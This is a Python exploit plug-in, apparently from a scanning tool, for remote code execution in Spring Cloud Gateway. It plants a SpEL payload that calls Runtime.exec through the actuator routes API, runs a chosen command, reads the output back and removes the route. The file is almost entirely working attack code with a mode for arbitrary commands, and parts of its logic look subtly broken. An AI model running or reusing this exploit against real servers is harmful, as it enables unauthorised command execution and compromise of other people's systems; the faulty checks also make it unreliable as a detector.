# -*- coding:utf-8 -*-
# Spring Gateway RCE
from .. import fileUtil
import json
import re
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests, session

data = {
    "id": "hacktest",
    "filters": [{
        "name": "AddResponseHeader",
        "args": {
            "name": "Result",
            "value": ""
        }
    }],
    "uri": "http://example.com"
}

header = {"Content-Type": "application/json"}

result_pattern = "AddResponseHeader Result = '(.*?)'"


class POC:
    def __init__(self, service: ServiceScan = None):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False
        self.speciality = ""
        self.description = ""

    def fingerprint(self):
        try:
            resp = self.requestUtil.get(self.service.url + "/actuator/gateway")
            if "Example Domain" in resp.text:
                return True
        except:
            return False

    def test(self, path="hacktest", cmd="id", type="poc"):
        data["filters"][0]["args"]["value"] = "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"{cmd}\"}).getInputStream()))}".replace("{cmd}", cmd)
        resp = self.requestUtil.post(self.service.url + f"/actuator/gateway/routes/{path}", header=header,
                                     data=json.dumps(data))
        if resp.status_code == 201:
            self.result = True
            self.description = f"新建Gateway路由: {path}"
            self.speciality = f"{path}"
        if type != "poc":
            self.requestUtil.post(self.service.url + "/actuator/gateway/refresh")
            resp = self.requestUtil.get(self.service.url + f"/actuator/gateway/routes/{path}")
            self.result = re.findall(result_pattern, resp.text)[0].replace("\\n", "\n")
        self.requestUtil.delete(self.service.url + f"/actuator/gateway/routes/{path}")
        return self.result.strip()

    def poc(self):
        try:
            self.test()
            if self.result:
                return ["Spring Gateway RCE", self.description], self.speciality
        except:
            return []
